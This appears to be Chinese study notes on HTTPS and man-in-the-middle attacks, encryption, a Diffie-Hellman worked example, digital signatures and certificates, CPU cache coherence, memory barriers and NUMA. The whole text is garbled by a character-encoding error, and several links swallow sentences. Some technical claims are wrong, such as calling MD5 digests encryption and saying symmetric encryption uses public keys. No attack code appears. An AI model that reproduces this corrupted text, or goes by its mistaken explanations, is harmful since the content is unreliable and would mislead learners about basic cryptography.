<p>å¦‚æœåªç”¨éå¯¹ç§°åŠ å¯†ï¼Œæ€§èƒ½ä¸å¥½ï¼Œç”¨ç§é’¥åŠ å¯†çš„å…¬é’¥èƒ½è§£å¼€ï¼ŒæœåŠ¡å™¨å‘çš„æ•°æ®ä¸­é—´äººèƒ½çœ‹åˆ°ï¼Œè€Œä¸”åŠ å¯†è€—æ—¶è¾ƒé•¿ï¼›</p>
<p>æœ€ç®€å•çš„è¯ä¹¦åŒ…å«ä¸€ä¸ªå…¬å¼€å¯†é’¥ã€åç§°ä»¥åŠè¯ä¹¦æˆæƒä¸­å¿ƒçš„æ•°å­—ç­¾å</p>
<p>ä½¿ç”¨é‡å®šå‘æ–¹å¼è®©ç”¨æˆ·å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œ ç”¨æˆ·è¯·æ±‚ï¼Œ<a href="http://www.baidu.comç„¶åé‡å®šå‘åˆ°https//www.baidu.com%EF%BC%8C%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E5%A6%82%E6%9E%9C%E5%9C%A8%E8%AE%BF%E9%97%AEwww.baidu.com%E8%BF%99%E6%AD%A5%E6%8B%A6%E6%88%AA%E4%BA%86%E7%9A%84%E8%AF%9D%E8%BF%98%E6%98%AF%E4%BC%9A%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C">www.baidu.comç„¶åé‡å®šå‘åˆ°https://www.baidu.comï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœåœ¨è®¿é—®www.baidu.comè¿™æ­¥æ‹¦æˆªäº†çš„è¯è¿˜æ˜¯ä¼šæœ‰é—®é¢˜ï¼Œ</a> å¯ä»¥é‡å®šå‘åˆ°å¦ä¸€ä¸ªä¼ªé€ çš„ç™¾åº¦ç½‘ç«™<a href="https://www.baldu.com,è¿™ä¸ªä¸­é—´äººå¯ä»¥ç”³è¯·åˆ°è¯ä¹¦./">https://www.baldu.comï¼Œè¿™ä¸ªä¸­é—´äººå¯ä»¥ç”³è¯·åˆ°è¯ä¹¦ã€‚</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848950.png" alt="image-20210601132322394"></p>
<p>å¦‚æœreturn 307æµè§ˆå™¨ä¼šåšå®‰å…¨æ£€æŸ¥ï¼ˆ302æ²¡æœ‰é™åˆ¶ï¼‰å°±åªèƒ½è·³è½¬åˆ°<a href="https://baidu.com,ä½†æ˜¯å¯ä»¥ä¸è®©ä½ return,ç›´æ¥æ‹¦æˆªè¯·æ±‚;/">https://baidu.comï¼Œä½†æ˜¯å¯ä»¥ä¸è®©ä½ returnï¼Œç›´æ¥æ‹¦æˆªè¯·æ±‚ï¼›</a></p>
<p>æµè§ˆå™¨å¯ä»¥å†åŠ å‡ å±‚æ¥éªŒè¯ï¼Œä¾‹å¦‚ç”µè„‘äº‘ç®¡å®¶éªŒè¯ï¼Œ ä¸­ç½‘å¯ä¿¡ç½‘ç«™éªŒè¯ï¼Œ çŸ¥é“åˆ›å®‡ï¼ˆå®‰å…¨è”ç›Ÿï¼‰éªŒè¯ï¼›</p>
<p>äººæœºäº¤äº’ï¼šä¾‹å¦‚çŸ­ä¿¡éªŒè¯ç ï¼Œæˆ–è€…å›¾å½¢éªŒè¯ç ï¼Œäººè„¸è¯†åˆ«ï¼Œuç›¾</p>
<h2 id="ç½‘ç»œå®‰å…¨"><a href="#ç½‘ç»œå®‰å…¨" class="headerlink" title="ç½‘ç»œå®‰å…¨"></a>ç½‘ç»œå®‰å…¨</h2><p>å¸¸è§æ”»å‡»æ–¹å¼:</p>
<ul>
<li>udpç‚¸å¼¹</li>
<li>dosæ”»å‡»</li>
<li>ddosæ”»å‡» : åˆ©ç”¨å¾ˆå¤šå°ç”µè„‘å»ç»™æœåŠ¡å™¨å‘æ•°æ®åŒ…ï¼Œæ²¡æœ‰å…¶ä»–åŠæ³•è§£å†³ï¼Œåˆ©ç”¨æ‰«æå·¥å…·æ‰«æå‡ºè‚‰æœºï¼Œåˆ©ç”¨è‚‰æœºç»™æœåŠ¡å™¨å‘æ•°æ®åŒ…ï¼Œä½¿å¾—æ­£å¸¸ç”¨æˆ·æ— æ³•è®¿é—®è¯¥æœåŠ¡å™¨</li>
<li>æ¶æ„ç¨‹åº<ul>
<li>è®¡ç®—æœºç—…æ¯’: ä¼šä¼ æŸ“å…¶ä»–ç¨‹åºçš„ç¨‹åº,ä¼ æŸ“æ˜¯é€šè¿‡ä¿®æ”¹å…¶ä»–ç¨‹åºæ¥æŠŠè‡ªèº«æˆ–è€…å…¶å˜ç§å¤åˆ¶è¿›å»</li>
<li>è®¡ç®—æœºè •è™«: é€šè¿‡ç½‘ç»œçš„é€šä¿¡åŠŸèƒ½å°†è‡ªèº«ä»ä¸€ä¸ªç»“ç‚¹å‘é€åˆ°å¦å¤–ä¸€ä¸ªç»“ç‚¹å¹¶å¯åŠ¨è¿è¡Œçš„ç¨‹åº</li>
<li>ç‰¹æ´›ä¼Šæœ¨é©¬: ä¸€ç§ç¨‹åº,å®ƒæ‰§è¡Œçš„åŠŸèƒ½è¶…è¿‡æ‰€å£°ç§°çš„åŠŸèƒ½</li>
<li>é€»è¾‘ç‚¸å¼¹: ä¸€ç§å½“è¿è¡Œç¯å¢ƒæ»¡è¶³æŸç§ç‰¹å®šæ¡ä»¶æ—¶æ‰§è¡Œå…¶ä»–ç‰¹æ®ŠåŠŸèƒ½çš„ç¨‹åº</li>
</ul>
</li>
</ul>
<h3 id="ä¸­é—´äººæ”»å‡»"><a href="#ä¸­é—´äººæ”»å‡»" class="headerlink" title="ä¸­é—´äººæ”»å‡»"></a>ä¸­é—´äººæ”»å‡»</h3><p>DHç®—æ³•å¹¶æ²¡æœ‰å¯¹åŒæ–¹èº«ä»½è¿›è¡ŒéªŒè¯ã€‚å½“Aliceå’ŒBobå¸Œæœ›è¿›è¡Œé€šä¿¡æ—¶ï¼ŒEveå¯ä»¥å¾ˆå®¹æ˜“åœ°å‘Aliceå†’å……è‡ªå·±æ˜¯Bobï¼Œä»¥åŠå‘Bobå†’å……è‡ªå·±æ˜¯Aliceï¼Œç„¶ååˆ†åˆ«å’ŒAliceå’ŒBobå»ºç«‹å…¬å…±çš„å¯¹ç§°å¯†é’¥ã€‚ç„¶åï¼ŒAliceåˆ°Bobçš„é€šä¿¡éƒ½ä¼šé€šè¿‡Eveå…ˆä½¿ç”¨è‡ªå·±ä¸Aliceå»ºç«‹çš„å¯†é’¥å…ˆè§£å¯†ï¼Œè·å¾—æ˜æ–‡ä¿¡æ¯ä¹‹åï¼Œå†ç”¨Eveä¸Bobå»ºç«‹çš„å¯†é’¥åŠ å¯†ï¼Œä¼ ç»™Bobã€‚Bobåˆ°Aliceçš„é€šä¿¡äº¦ç„¶ã€‚è¿™æ ·ï¼ŒAliceå’ŒBobä¼šä»¥ä¸ºè‡ªå·±å’Œå¯¹æ–¹çš„é€šä¿¡æ˜¯åŠ å¯†çš„ï¼Œä»è€Œæ˜¯å®‰å…¨çš„ï¼Œä½†æ˜¯å®ƒä»¬çš„é€šä¿¡ä¼šç»è¿‡EveåŠ è§£å¯†ä¸€éã€‚Eveåœ¨Aliceå’ŒBobä¹‹é—´ï¼Œæ‹¦æˆªä»–ä»¬çš„é€šä¿¡ï¼Œå¹¶ä¸”ç»´æŒé€šä¿¡ï¼Œå°±ç§°ä¸ºä¸­é—´äººæ”»å‡»ã€‚</p>
<h2 id="å¯¹ç§°åŠ å¯†"><a href="#å¯¹ç§°åŠ å¯†" class="headerlink" title="å¯¹ç§°åŠ å¯†"></a>å¯¹ç§°åŠ å¯†</h2><p>æ•ˆç‡é«˜,å¯†é’¥ä¸é€‚åˆåœ¨ç½‘ä¸Šä¼ è¾“, å¯†é’¥ç»´æŠ¤éº»çƒ¦</p>
<h3 id="DES-Data-Encyption-Standard"><a href="#DES-Data-Encyption-Standard" class="headerlink" title="DES(Data Encyption Standard)"></a>DES(Data Encyption Standard)</h3><p>å®ƒçš„ä¿å¯†æ€§å–å†³äºå¯†é’¥çš„ä¿å¯†, ç®—æ³•æ˜¯å…¬å¼€çš„. desæ˜¯ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªå…¬è®¤çš„å®ç”¨å¯†ç ç®—æ³•æ ‡å‡†,å®ƒæ›¾å¯¹å¯†ç å­¦çš„å‘å±•åšå‡ºäº†é‡å¤§è´¡çŒ®. 56ä½å¯†é’¥ç ´è§£éœ€è¦3.5æˆ–21åˆ†é’Ÿ, 128ä½å¯†é’¥ç ´è§£éœ€è¦5.4*10 18æ¬¡æ–¹å…‰å¹´.</p>
<h2 id="éå¯¹ç§°åŠ å¯†"><a href="#éå¯¹ç§°åŠ å¯†" class="headerlink" title="éå¯¹ç§°åŠ å¯†"></a>éå¯¹ç§°åŠ å¯†</h2><p>ä½¿ç”¨å¯†é’¥å¯¹,å…¬é’¥åŠ å¯†ç§é’¥è§£å¯†,ç§é’¥åŠ å¯†å…¬é’¥è§£å¯†. </p>
<p>ç”±äºåŠ å¯†æ¯”è¾ƒæ…¢,å¯ä»¥å…ˆç”¨å¯¹ç§°åŠ å¯†åŠ å¯†æ–‡ä»¶,ç„¶åç”¨å…¬é’¥åŠ å¯†å¯†é’¥,ç„¶åå¯¹æ–¹ä½¿ç”¨ç§é’¥è§£å¯†å¯†é’¥,ç„¶åç”¨å¯†ç è§£å¯†æ–‡ä»¶.</p>
<h3 id="DHç®—æ³•"><a href="#DHç®—æ³•" class="headerlink" title="DHç®—æ³•"></a>DHç®—æ³•</h3><ol>
<li><p>Aliceå’ŒBobé€šè¿‡äº¤æµ,å†³å®šé€‰æ‹©ç´ æ•°$p&#x3D;23$ä»¥åŠåŸæ ¹$g&#x3D;5$</p>
</li>
<li><p>Aliceé€‰æ‹©ä¸€ä¸ªç§˜å¯†æ•´æ•°$a&#x3D;4$,Bobé€‰æ‹©ä¸€ä¸ªç§˜å¯†æ•´æ•°$b&#x3D;3$</p>
</li>
<li><p>Aliceå’ŒBobåˆ†åˆ«ä½¿ç”¨$p,g,a$å’Œ$b$è®¡ç®—å‡º$A$å’Œ$B$</p>
<blockquote>
<p>$$<br>A&#x3D;g^amod(p)&#x3D;5^4mod(23)&#x3D;4<br>\<br>B&#x3D;g^bmod(p)&#x3D;5^3mod(23)&#x3D;10<br>$$</p>
</blockquote>
</li>
<li><p>Aliceå’ŒBobåˆ†åˆ«å°†è¿™ä¸¤ä¸ªæ•°å­—$A&#x3D;4$å’Œ$B&#x3D;10$é€šè¿‡ç½‘ç»œå‘é€ç»™å¯¹æ–¹ã€‚</p>
</li>
<li><p>Aliceå’ŒBobæ”¶åˆ°$B$å’Œ$A$ä¹‹åï¼Œåˆ†åˆ«è®¡ç®—ï¼š</p>
<blockquote>
<p>$$<br>s&#x3D;B^amod(p)&#x3D;10^4mod(23)&#x3D;18\<br>s&#x3D;A^bmod(p)&#x3D;4^3mod(23)&#x3D;18<br>$$</p>
</blockquote>
</li>
<li><p>ç°åœ¨Aliceå’ŒBobæ‹¥æœ‰äº†ä¸€ä¸ªå…±åŒçš„å¯†é’¥18ã€‚è€Œä¸”è¿™ä¸ªå¯†é’¥ä»æ¥æ²¡æœ‰åœ¨ç½‘ç»œä¸Šä¼ è¾“è¿‡</p>
</li>
</ol>
<p>ä¸ºä»€ä¹ˆAliceå’ŒBobå¯ä»¥è·å¾—å…±åŒçš„å…¬é’¥å‘¢?</p>
<p>$A^bmod(p)&#x3D;(g^a)^bmod(p)&#x3D;(g^b)^amod(p)&#x3D;B^amod(p)$</p>
<p>é‚£ç°åœ¨çœ‹ä¸€ä¸‹ï¼ŒDHç®—æ³•å¯ä»¥è¿è¡Œçš„å…³é”®æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>å³ä½¿æ”»å‡»è€…Eveå¯ä»¥è·å¾—23ã€5ã€$A$å’Œ$B$ï¼Œå¥¹ä»ç„¶ä¸èƒ½å¾—åˆ°Aliceå’ŒBobçš„ç§˜å¯†æ•°å­—4å’Œ3ã€‚ä¹Ÿå³ï¼Œå³ä½¿çŸ¥é“ $5^3mod(23)&#x3D;10$è¿™ä¸ªè®¡ç®—è¿‡ç¨‹ä¸­çš„åº•æ•°5ï¼Œæ¨¡æ•°23å’Œç»“æœ10ï¼Œå¥¹ä¾ç„¶ä¸èƒ½å¾—åˆ°æŒ‡æ•°3ã€‚è¿™ä¸ªå°±æ˜¯DHç®—æ³•æ‰€ä¾èµ–çš„è®¡ç®—ç¦»æ•£å¯¹æ•°çš„éš¾åº¦ã€‚ï¼ˆè¯æ˜è®¡ç®—ç¦»æ•£å¯¹æ•°å¾ˆéš¾è¶…çº²ï¼‰</p>
<h4 id="åŸæ ¹"><a href="#åŸæ ¹" class="headerlink" title="åŸæ ¹"></a>åŸæ ¹</h4><p>å¦‚æœaæ˜¯ç´ æ•°<em>p</em>çš„ä¸€ä¸ªåŸæ ¹ï¼Œé‚£ä¹ˆæ•°å€¼ï¼š</p>
<p><em>a</em>mod<em>p</em>ï¼Œ<em>a^2</em> mod<em>p</em>ï¼Œâ€¦ï¼Œ<em>a^(p-1)</em> mod<em>p</em></p>
<p>æ˜¯å„ä¸ç›¸åŒçš„æ•´æ•°ï¼Œä¸”ä»¥æŸç§æ’åˆ—æ–¹å¼ç»„æˆäº†ä»<em>1</em>åˆ°<em>p-1</em>çš„æ‰€æœ‰æ•´æ•°ã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯æ•°å­—ç­¾å"><a href="#ä»€ä¹ˆæ˜¯æ•°å­—ç­¾å" class="headerlink" title="ä»€ä¹ˆæ˜¯æ•°å­—ç­¾å?"></a>ä»€ä¹ˆæ˜¯æ•°å­—ç­¾å?</h3><p>ä¸ºäº†é¿å…æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«æ›¿æ¢ï¼Œæ¯”å¦‚é»‘å®¢ä¿®æ”¹äº†ä½ çš„æŠ¥æ–‡å†…å®¹ï¼Œä½†æ˜¯ä½ å¹¶ä¸çŸ¥é“ï¼Œæ‰€ä»¥æˆ‘ä»¬è®©å‘é€ç«¯åšä¸€ä¸ªæ•°å­—ç­¾åï¼ŒæŠŠæ•°æ®çš„æ‘˜è¦æ¶ˆæ¯è¿›è¡Œä¸€ä¸ªåŠ å¯†ï¼Œæ¯”å¦‚ MD5ï¼Œå¾—åˆ°ä¸€ä¸ªç­¾åï¼Œå’Œæ•°æ®ä¸€èµ·å‘é€ã€‚ç„¶åæ¥æ”¶ç«¯æŠŠæ•°æ®æ‘˜è¦è¿›è¡Œ MD5 åŠ å¯†ï¼Œå¦‚æœå’Œç­¾åä¸€æ ·ï¼Œåˆ™è¯´æ˜æ•°æ®ç¡®å®æ˜¯çœŸçš„ã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯æ•°å­—è¯ä¹¦ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯æ•°å­—è¯ä¹¦ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯æ•°å­—è¯ä¹¦ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯æ•°å­—è¯ä¹¦ï¼Ÿ</h3><p>å¯¹ç§°åŠ å¯†ä¸­ï¼ŒåŒæ–¹ä½¿ç”¨å…¬é’¥è¿›è¡Œè§£å¯†ã€‚è™½ç„¶æ•°å­—ç­¾åå¯ä»¥ä¿è¯æ•°æ®ä¸è¢«æ›¿æ¢ï¼Œä½†æ˜¯æ•°æ®æ˜¯ç”±å…¬é’¥åŠ å¯†çš„ï¼Œå¦‚æœå…¬é’¥ä¹Ÿè¢«æ›¿æ¢ï¼Œåˆ™ä»ç„¶å¯ä»¥ä¼ªé€ æ•°æ®ï¼Œå› ä¸ºç”¨æˆ·ä¸çŸ¥é“å¯¹æ–¹æä¾›çš„å…¬é’¥å…¶å®æ˜¯å‡çš„ã€‚æ‰€ä»¥ä¸ºäº†ä¿è¯å‘é€æ–¹çš„å…¬é’¥æ˜¯çœŸçš„ï¼ŒCA è¯ä¹¦æœºæ„ä¼šè´Ÿè´£é¢å‘ä¸€ä¸ªè¯ä¹¦ï¼Œé‡Œé¢çš„å…¬é’¥ä¿è¯æ˜¯çœŸçš„ï¼Œç”¨æˆ·è¯·æ±‚æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨å°†è¯ä¹¦å‘ç»™ç”¨æˆ·ï¼Œè¿™ä¸ªè¯ä¹¦æ˜¯ç»ç”±ç³»ç»Ÿå†…ç½®è¯ä¹¦çš„å¤‡æ¡ˆçš„ã€‚</p>
<h3 id="è·å–æ•°å­—è¯ä¹¦"><a href="#è·å–æ•°å­—è¯ä¹¦" class="headerlink" title="è·å–æ•°å­—è¯ä¹¦"></a>è·å–æ•°å­—è¯ä¹¦</h3><p>å°†è‡ªå·±çš„å…¬é’¥ä»¥åŠä¿¡æ¯å‘ç»™CAå®¡æ ¸,CAå®¡æ ¸åç”¨è‡ªå·±çš„ç§é’¥å¯¹è¿™äº›ä¿¡æ¯è¿›è¡ŒåŠ å¯†,å¾—åˆ°ç­¾å,å°†å…¬é’¥,ä¸ªäººä¿¡æ¯ä»¥åŠç­¾åæ”¾åœ¨ä¸€èµ·å½¢æˆæ•°å­—è¯ä¹¦å‘ç»™ç”³è¯·è€…. </p>
<h4 id="å®é™…æ¡ˆä¾‹"><a href="#å®é™…æ¡ˆä¾‹" class="headerlink" title="å®é™…æ¡ˆä¾‹"></a>å®é™…æ¡ˆä¾‹</h4><ul>
<li>Aå…¬å¸å‘Bå…¬å¸å‘é‚®ä»¶(å†…å®¹ä¸ä¿å¯†,ä½†æ˜¯å¿…é¡»çš„ç¡®å®šæ˜¯Aå…¬å¸å‘çš„), å°†é‚®ä»¶ç”¨å•å‘æ•£åˆ—å‡½æ•°ç®—å‡º128ä½æ‘˜è¦,ç„¶åç”¨Açš„ç§é’¥å¯¹æ‘˜è¦åŠ å¯†å¾—åˆ°æ•°å­—ç­¾å,ç„¶åå°†é‚®ä»¶,æ•°å­—ç­¾åä»¥åŠæ•°å­—è¯ä¹¦å‘ç»™å…¬å¸B,å…¬å¸Bå…ˆç”¨CAçš„å…¬é’¥éªŒè¯è¯ä¹¦æ˜¯å¦æ˜¯CAæ‰€é¢å‘(ç„¶åè¿˜å¾—å»caä¸ŠæŸ¥æ”¹æ•°å­—è¯ä¹¦æ˜¯å¦å±äºæŒ‚å¤±çŠ¶æ€),é€šè¿‡å,ç„¶åç”¨åŒæ ·çš„å•å‘æ•£åˆ—å‡½æ•°ç®—å‡º128ä½æ‘˜è¦,ç„¶åç”¨Açš„æ•°å­—è¯ä¹¦é‡Œé¢çš„Açš„å…¬é’¥å¯¹æ•°å­—ç­¾åè¿›è¡Œè§£å¯†,çœ‹ç»“æœæ˜¯å¦ç›¸åŒ,ç»“æœç›¸åŒçš„è¯å°±å¯ä»¥ä¿è¯è¿™ä»½é‚®ä»¶ç”±Aå‘å‡º,ä¸”æ²¡æœ‰è¢«ä¿®æ”¹è¿‡ </li>
<li>å…šä¸­å¤®å‘åœ°æ–¹æ”¿åºœå‘ä¸€å°é‚®ä»¶, å†…å®¹ä¸ä¿å¯†,ä½†æ˜¯ä¸èƒ½åˆ«ç¯¡æ”¹,ä¹Ÿæ˜¯ä½¿ç”¨è¿™ç§æ•°å­—ç­¾åçš„æ–¹å¼.</li>
<li>Aç”¨æˆ·å’ŒBç½‘ç«™é€šä¿¡</li>
<li>Aå…¬å¸å‘Bå…¬å¸å‘ä¸€ä»½é‚®ä»¶,å†…å®¹ä¿å¯†,å¹¶ä¸”è¿˜å¾—ç¡®å®šæ˜¯Aå…¬å¸å‘çš„ ,Bå…¬å¸å°†Bçš„å…¬é’¥å‘ç»™A,Aå…¬å¸ç”¨è¿™ä¸ªå…¬é’¥å¯¹é‚®ä»¶åŠ å¯†(å†…å®¹ä¿å¯†). å¯¹åŠ å¯†åçš„å†…å®¹è®¡ç®—æ‘˜è¦,ç”¨Açš„ç§é’¥åŠ å¯†å½¢æˆæ•°å­—ç­¾å,å‘ç»™B,Bå…ˆç”¨CAçš„å…¬é’¥éªŒè¯è¯ä¹¦,ç„¶åç”¨è®¡ç®—æ‘˜è¦,ç”¨Açš„å…¬é’¥è§£å¯†ç­¾å,æ¯”å¯¹æ˜¯å¦ç›¸åŒ,ç„¶åç”¨è‡ªå·±çš„ç§é’¥è§£å¼€é‚®ä»¶.</li>
</ul>
<h1 id="è®¡ç®—æœºç»„æˆåŸç†"><a href="#è®¡ç®—æœºç»„æˆåŸç†" class="headerlink" title="è®¡ç®—æœºç»„æˆåŸç†"></a>è®¡ç®—æœºç»„æˆåŸç†</h1><p>å¤šæ ¸cpuæ€§èƒ½å¥½, ä½†æ˜¯æˆæœ¬é«˜; å¤šcpuæˆæœ¬å°,ä¾¿å®œ,ä½†æ˜¯æ€§èƒ½ç›¸å¯¹è¾ƒå·®;</p>
<p>è¶…çº¿ç¨‹, ä¸€ä¸ªæ ¸é‡Œé¢æœ‰ä¸¤ç»„å¯„å­˜å™¨,pc,ä½†åªæœ‰ä¸€ä¸ªALU,ä¸¤ä¸ªçº¿ç¨‹åˆ‡æ¢ä¸éœ€è¦ä¿å­˜ç°åœº,é€Ÿåº¦å¾ˆå¿«; 4æ ¸8çº¿ç¨‹æ˜¯æŒ‡æœ‰4ä¸ªæ ¸,æ¯ä¸ªæ ¸æœ‰ä¸¤ç»„å¯„å­˜å™¨å’Œpc;</p>
<p>ä¸€ä¸ªcacheline 64å­—èŠ‚, ä»å†…å­˜ä¸€æ¬¡ä¸­ä¸€æ¬¡è¯»ä¸€ä¸ªcacheline, å…ˆè¯»åˆ°L3cache, ç„¶åL2cache, ç„¶åL1cache;</p>
<p>å›¾ä¸­ä¸€ä¸ªcpué‡Œé¢ä¸¤ä¸ªæ ¸, ä¸€èˆ¬L3Cache1åªåœ¨ä¸€ä¸ªcpué‡Œé¢;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848138.png" alt="image-20210423105857316"></p>
<p>å‡è®¾å¯¹xå’Œyä½¿ç”¨äº†volatile,é‚£ä¹ˆç¼“å­˜éœ€è¦ä¸€è‡´,ä¿æŒå¯è§æ€§,ä½¿ç”¨ç¼“å­˜ä¸€è‡´æ€§åè®®</p>
<p>çº¿ç¨‹1åªç”¨x, è€Œçº¿ç¨‹2åªç”¨y,ä½¿ç”¨æœ‰ç¼“å­˜ä¸€è‡´æ€§åè®®,xæ”¹äº†,çº¿ç¨‹äºŒä¹Ÿå¾—é‡æ–°è¯»ç¼“å­˜è¡Œ,å…¶å®æ²¡æœ‰å¿…è¦,å®ƒåªç”¨y, å¯ä»¥ç¼“å­˜è¡Œå¯¹é½çš„æ–¹å¼è§£å†³, æµªè´¹å‡ ä¸ªç©ºé—´,xåé¢ç”¨æ— ç”¨æ•°æ®å æ»¡;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848127.png" alt="image-20210423110113455"></p>
<p>MSI MESI(intel) MOSI Synapse Firefly Dragon éƒ½æ˜¯ç¼“å­˜ä¸€è‡´æ€§åè®®,åªæ˜¯ç”¨åœ¨ä¸åŒçš„cpuä¸Š</p>
<p>ç¡¬ä»¶ä¸Šä½¿ç”¨ç¼“å­˜é”;</p>
<p>å¦‚æœå…¶ä¸­ä¸€ä¸ªç¼“å­˜è¡Œæ”¹äº†,å®ƒä¼šå†™å›ä¸»å­˜,å®ƒè¿˜ä¼šé€šè¿‡æ€»çº¿,å‘Šè¯‰å¦ä¸€ä¸ªç¼“å­˜è¡Œä½ è¿™ä¸ªæ˜¯invaild,ç„¶åè¿™ä¸ªç¼“å­˜è¡Œå›å»ç¼“å­˜ä¸­è¯»è¿‡; </p>
<p>MESI, æ€»çº¿é”æ˜¯volatileçš„å…·ä½“å®ç°;</p>
<p>volatileåœ¨jvmçº§åˆ«æ˜¯é€šè¿‡å†…å­˜å±éšœæ¥é˜²æ­¢ä¹±åºæ‰§è¡Œ;åˆ°c++è¿™ä¸ªçº§åˆ«æ˜¯é€šè¿‡lockæ‰§è¡Œæ¥ä¿è¯;</p>
<h4 id="DCL-double-checked-locking-å•ä¾‹æ¨¡å¼éœ€è¦åŠ volatileå—"><a href="#DCL-double-checked-locking-å•ä¾‹æ¨¡å¼éœ€è¦åŠ volatileå—" class="headerlink" title="DCL (double-checked locking)å•ä¾‹æ¨¡å¼éœ€è¦åŠ volatileå—"></a>DCL (double-checked locking)å•ä¾‹æ¨¡å¼éœ€è¦åŠ volatileå—</h4><p>å¯¹è±¡åˆ›å»ºåˆ†ä¸º3æ­¥, åˆ†é…å†…å­˜(æ­¤æ—¶çš„å˜é‡éƒ½åªæœ‰é»˜è®¤å€¼),åˆå§‹åŒ–,ç„¶åå¼•ç”¨æŒ‡å‘è¿™å—å†…å­˜</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848148.png" alt="image-20210423114558613"></p>
<p>å‡è®¾ç¬¬ä¸€ä¸ªçº¿ç¨‹åˆå§‹åŒ–çš„æ—¶å€™å‘ç”ŸæŒ‡ä»¤é‡æ‹,æŒ‡å‘äº†åŠåˆå§‹åŒ–å¯¹è±¡, æ­¤æ—¶è¿˜æ²¡æœ‰æ‰§è¡Œæ„é€ æ–¹æ³•; </p>
<p>ç„¶åç¬¬äºŒä¸ªçº¿ç¨‹æ¥äº†, å…ˆåˆ¤æ–­tæ˜¯å¦ä¸ºç©º, ä¸ç©ºå°±ç›´æ¥ç”¨,ä½¿ç”¨äº†åŠåˆå§‹åŒ–çš„å¯¹è±¡,è¿è¡Œä¸€ç™¾ä¸‡æ¬¡éƒ½éš¾å¾—å‡ºç°ä¸€æ¬¡,æ²¡æœ‰å¹¶å‘ä¸€å®šä¸ä¼šå‡ºç°.</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848159.png" alt="image-20210423114754951"></p>
<p>cpuæŒ‡ä»¤é‡æ’: å‡è®¾æŒ‡ä»¤ä¸€å»è¯»æ•°æ®äº†,ç„¶åæŒ‡ä»¤äºŒä¸ä¾èµ–äºæŒ‡ä»¤ä¸€,cpuå°±ä¼šæ¥ç€æ‰§è¡ŒæŒ‡ä»¤äºŒ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848295.png" alt="image-20210423111942569"></p>
<p>wcbuffer (write combining)åˆå¹¶å†™buffer, å°±4ä¸ªå­—èŠ‚,</p>
<p>ä¸ºäº†æé«˜æ•ˆç‡,cpuåœ¨å†™å…¥L1æ—¶,åŒæ—¶ç”¨wcå†™å…¥L2, ç”±äºALUé€Ÿåº¦å¤ªå¿«,æ‰€ä»¥åœ¨å†™å…¥L1çš„åŒæ—¶,å†™å…¥ä¸€ä»½WCBuffer , æ»¡äº†ä¹‹å, å†ç›´æ¥æ›´æ–°åˆ°L2</p>
<h4 id="cpuå±‚é¢å¦‚ä½•ç¦æ­¢é‡æ’åº"><a href="#cpuå±‚é¢å¦‚ä½•ç¦æ­¢é‡æ’åº" class="headerlink" title="cpuå±‚é¢å¦‚ä½•ç¦æ­¢é‡æ’åº?"></a>cpuå±‚é¢å¦‚ä½•ç¦æ­¢é‡æ’åº?</h4><p>å†…å­˜å±éšœ, å¯¹æŸéƒ¨åˆ†å†…å­˜åšæ“ä½œæ—¶å‰åæ·»åŠ å±éšœ, å±éšœå‰åçš„æ“ä½œä¸å¯ä»¥ä¹±åºæ‰§è¡Œ</p>
<h4 id="ç¦æ­¢ä¹±åº"><a href="#ç¦æ­¢ä¹±åº" class="headerlink" title="ç¦æ­¢ä¹±åº"></a>ç¦æ­¢ä¹±åº</h4><p>cpuå±‚é¢: Intel -ã€‹åŸè¯­(mfence, lfence, sfence)æˆ–è€…é”æ€»çº¿</p>
<p>JVMå±‚é¢: 8ä¸ªhappens-beforeåŸåˆ™, 4ä¸ªå†…å­˜å±éšœ(ll, ls, sl, ss)</p>
<p>as if serial: ä¸ç®¡ç¡¬ä»¶ä»€ä¹ˆæ‰§è¡Œé¡ºåº, å•çº¿ç¨‹æ‰§è¡Œçš„ç»“æœä¸å˜, çœ‹ä¸Šå»åƒæ˜¯serial</p>
<p>hotspotå°±ä½¿ç”¨äº†lock(æ±‡ç¼–æŒ‡ä»¤)æŒ‡ä»¤æ¥æ‰§è¡Œ</p>
<h1 id="æ“ä½œç³»ç»Ÿ"><a href="#æ“ä½œç³»ç»Ÿ" class="headerlink" title="æ“ä½œç³»ç»Ÿ"></a>æ“ä½œç³»ç»Ÿ</h1><p>30å¤©è‡ªåˆ¶æ“ä½œç³»ç»Ÿ</p>
<p>Linuxå†…æ ¸è®¾è®¡ä¸å®ç°</p>
<p>UMA ï¼šUniform memory access</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848308.png" alt="image-20210605203758287"></p>
<p>NUMAï¼š Non Uniform Memory Access</p>
<p>åˆ†é…å†…å­˜ä¼šä¼˜å…ˆåˆ†é…ç¦»è¯¥çº¿ç¨‹æœ€è¿‘çš„å†…å­˜</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848396.png" alt="image-20210605203834153"></p>
<h2 id="å¯åŠ¨è¿‡ç¨‹"><a href="#å¯åŠ¨è¿‡ç¨‹" class="headerlink" title="å¯åŠ¨è¿‡ç¨‹"></a>å¯åŠ¨è¿‡ç¨‹</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848739.png" alt="image-20210423163941164"></p>
